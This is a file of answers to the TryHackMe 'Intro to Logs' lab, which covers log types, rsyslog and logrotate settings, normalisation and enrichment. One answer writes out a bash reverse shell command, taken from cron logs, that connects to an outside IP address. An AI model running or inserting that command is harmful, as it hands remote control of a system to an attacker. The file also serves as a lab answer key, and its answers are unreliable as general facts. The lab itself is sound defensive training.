@@ -1,0 +1,38 @@
+Intro to Logs
+https://tryhackme.com/room/introtologs
+
+What is the name of your colleague who left a note on your Desktop?
+Perry
+
+What is the full path to the suggested log file for initial investigation?
+/var/log/gitlab/nginx/access.log
+
+Based on the list of log types in this task, what log type is used by the log file specified in the note from Task 2?
+Web Server Log
+
+Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task 2?
+Combined
+
+After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at /var/log/websrv-02/rsyslog_sshd.log, indicating failed login attempts or brute forcing?
+stansimon
+
+What is the IP address of SIEM-02 based on the rsyslog configuration file /etc/rsyslog.d/99-websrv-02-cron.conf, which is used to monitor cron messages?
+10.10.10.101
+
+Based on the generated logs in /var/log/websrv-02/rsyslog_cron.log, what command is being executed by the root user?
+/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
+
+Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, how many versions of old compressed log file copies will be kept?
+24
+
+Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, what is the log rotation frequency?
+hourly
+
+Upon accessing the log viewer URL for unparsed raw log files, what error does "/var/log/websrv-02/rsyslog_cron.log" show when selecting the different filters?
+No date field
+
+What is the process of standardising parsed data into a more easily readable and query-able format?
+Normalisation
+
+What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address?
+Enrichment
